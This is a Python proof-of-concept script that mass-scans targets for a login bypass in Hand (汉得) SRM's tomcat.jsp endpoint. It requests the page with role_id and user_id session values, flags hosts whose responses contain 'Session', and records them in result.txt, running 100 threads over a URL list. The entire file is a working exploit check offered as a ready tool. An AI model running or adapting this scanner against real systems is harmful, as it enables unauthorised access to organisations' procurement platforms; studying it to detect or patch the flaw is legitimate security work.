import argparse,requests,sys
from multiprocessing.dummy import Pool

def banner():
    test = """
███████╗██████╗ ███╗   ███╗
██╔════╝██╔══██╗████╗ ████║
███████╗██████╔╝██╔████╔██║
╚════██║██╔══██╗██║╚██╔╝██║
███████║██║  ██║██║ ╚═╝ ██║
╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝                   
"""
    print(test)

def poc(target):
    payload = '/tomcat.jsp?dataName=role_id&dataValue=1'
    payload1 = '/tomcat.jsp?dataName=user_id&dataValue=1'

    try:
        res1 = requests.get(url=target+payload,verify=False,timeout=5)
        if res1.status_code == 200 and 'Session' in res1.text:
            res2 = requests.get(url=target+payload1,verify=False,timeout=5)
            if res2.status_code == 200 and 'Session' in res2.text:
                with open('result.txt','a',encoding='utf-8') as f:
                    f.write(f'{target}\n')
                print(f"[+]该{target}存在登录绕过")
            else:
                print(f"[-]该{target}不存在登录绕过")
        else:
            print(f"该{target}可能存在问题，请手工检测")
    except Exception as e:
        print(e)


def main():

    banner()
    url_list = []
    parse = argparse.ArgumentParser(description="汉得SRM tomcat.jsp 登陆绕过漏洞")

    parse.add_argument("-u","--url",dest="url",type=str,help="Please enter url")
    parse.add_argument("-f","--file",dest="file",type=str,help="Please enter file")

    args = parse.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        with open(args.file,'r',encoding='utf-8') as f:
            for url in f.readlines():
                url = url.strip()
                url_list.append(url.replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

if __name__ == '__main__':
    main()